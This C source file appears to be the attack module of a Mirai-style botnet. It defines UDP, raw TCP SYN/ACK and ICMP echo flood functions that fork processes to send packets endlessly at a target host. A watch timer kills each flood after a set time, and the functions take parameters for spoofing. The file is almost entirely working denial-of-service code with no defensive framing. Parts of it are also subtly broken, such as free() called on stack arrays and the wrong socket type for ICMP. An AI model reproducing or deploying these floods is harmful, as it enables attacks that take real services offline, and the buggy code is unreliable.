#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <netinet/ip.h>

#include "headers/rand.h"
#include "headers/util.h"
#include "headers/utils.h"

void watch(int seconds)
{
    if (!fork())
    {
#ifdef DEBUG
        printf("[watch] started (%d), sleeping (%d) seconds\n", getpid(), seconds);
#endif
        sleep(seconds);
#ifdef DEBUG
        printf("[watch] finished sleeping, killing flood (%d)\n", getppid());
#endif
        kill(getppid(), SIGKILL);
#ifdef DEBUG
        printf("[watch] exit\n");
#endif
        exit(0);
    }
}

void udp(char *ip, int port, int seconds, int len)
{
    if (!fork())
    {
#ifdef DEBUG
        printf("[flood] started (%d)\n", getpid());
#endif
        int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

        if (fd == -1)
        {
#ifdef DEBUG
            printf("[flood] socket failed\n");
#endif
            return;
        }

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip);

        if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
        {
#ifdef DEBUG
            printf("[flood] connect failed\n");
#endif
            close(fd);
            return;
        }

        char string[len];
        rand_alphanum(string, len);
        watch(seconds);

#ifdef DEBUG
        printf("[flood] sending (%s)\n", string);
#endif
        while (1)
            send(fd, string, len, MSG_NOSIGNAL);
    }
}
void init_ip_headers(struct iphdr *iph, char *rdbuf, char *dhost, int spoof, int protocol) {
    char *shost;
    iph->saddr = util_local_addr();
    iph->daddr = inet_addr(dhost);
    iph->ttl = 64;
    iph->version = 4;
    iph->protocol = protocol;
    iph->ihl = 5;
    iph->id = rand();
    iph->tot_len = sizeof(rdbuf) + sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

}
void init_tcp_headers(struct iphdr *iph, struct tcphdr *tcph, int dport, int syn, int ack, int fin, int rst, int urg, int psh) {
    tcph->source = htons(rand() % 65536);
    tcph->dest = htons(dport);
    tcph->doff = 5;
    tcph->fin = fin;
    tcph->syn = syn;
    tcph->rst = rst;
    tcph->psh = psh;
    tcph->ack = ack;
    tcph->urg = urg;
    tcph->window = htons(rand() % 0xffff);
    tcph->check = 0;
    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

}
void tcp_raw_flood(char *host, int port, int seconds, int psize, int spoof) {
if(!fork()) {
    srand(time(NULL) ^ getpid());

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    psize = psize + rand() % 512;

    char rdbuf[4096], string[psize];
    rand_alphanum(string, psize);

    struct sockaddr_in addr;

    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    struct iphdr *iph = (struct iphdr *)rdbuf;
    struct tcphdr *tcph = (struct tcphdr *) (rdbuf + sizeof(struct iphdr));

    init_ip_headers(iph, rdbuf, host, spoof, IPPROTO_TCP);
    init_tcp_headers(iph, tcph, port, 1, 1, 0, 0, 0, 0);

    util_memcpy((void *)tcph + sizeof(struct tcphdr), string, util_strlen(string));
    free(string);

    watch(seconds);

    while(1)
        sendto(sock, rdbuf, psize, MSG_NOSIGNAL, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}
}
void icmp_echo_flood(char *host, int port, int seconds, int psize, int spoof) {
if(!fork()) {
    srand(time(NULL) ^ getpid());

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP), start = time(NULL);
    psize = psize + rand() % 512;

    char rdbuf[4096], string[psize];
    rand_alphanum(string, psize);

    struct sockaddr_in addr;

    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    struct iphdr *iph = (struct iphdr *)rdbuf;
    struct icmphdr *icmph = (struct icmphdr *) (rdbuf + sizeof(struct iphdr));

    init_ip_headers(iph, rdbuf, host, spoof, IPPROTO_ICMP);
    
    icmph->un.echo.sequence = rand();
    icmph->un.echo.id = rand();
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->checksum = checksum_generic((uint16_t *) (rdbuf + sizeof(struct iphdr)), sizeof(struct icmphdr));

    util_memcpy((void *)icmph + sizeof(struct icmphdr), string, util_strlen(string));
    free(string);

    connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    watch(seconds);

    while(1)
        send(sock, rdbuf, psize, MSG_NOSIGNAL);
}
}
